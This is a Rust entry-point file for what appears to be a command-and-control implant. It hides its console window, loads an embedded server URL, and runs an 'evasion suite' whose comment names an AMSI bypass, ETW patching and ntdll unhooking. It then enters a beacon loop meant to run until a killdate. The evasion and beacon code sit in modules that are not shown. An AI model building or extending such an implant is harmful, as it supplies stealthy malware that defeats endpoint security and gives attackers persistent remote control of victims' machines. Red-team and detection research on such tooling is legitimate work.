#![windows_subsystem = "windows"]

mod beacon;
mod config;
mod core;
mod crypto;
mod transport;
mod utils;

use std::sync::Arc;

fn main() {
    // Log to file for debugging
    let _ = std::fs::write("agent_debug.log", format!("Agent starting at {:?}\n", std::time::SystemTime::now()));
    
    // Initialize configuration from embedded compile-time values
    let config = match std::panic::catch_unwind(|| config::Config::embedded()) {
        Ok(c) => {
            let _ = std::fs::write("agent_debug.log", format!("Config loaded. Server: {}\n", c.server_url));
            Arc::new(c)
        }
        Err(e) => {
            let _ = std::fs::write("agent_debug.log", format!("Config PANIC: {:?}\n", e));
            return;
        }
    };

    // Run evasion suite before anything else (AMSI bypass, ETW patch, ntdll unhooking)
    #[cfg(all(target_os = "windows", feature = "evasion"))]
    {
        let _ = std::fs::write("agent_debug.log", "Running evasion init...\n".to_string());
        utils::evasion::init();
        let _ = std::fs::write("agent_debug.log", "Evasion init done.\n".to_string());
    }

    let _ = std::fs::write("agent_debug.log", "Starting beacon loop...\n".to_string());
    
    // Start the beacon loop (runs forever until killdate or cleanup)
    beacon::run(config);
}
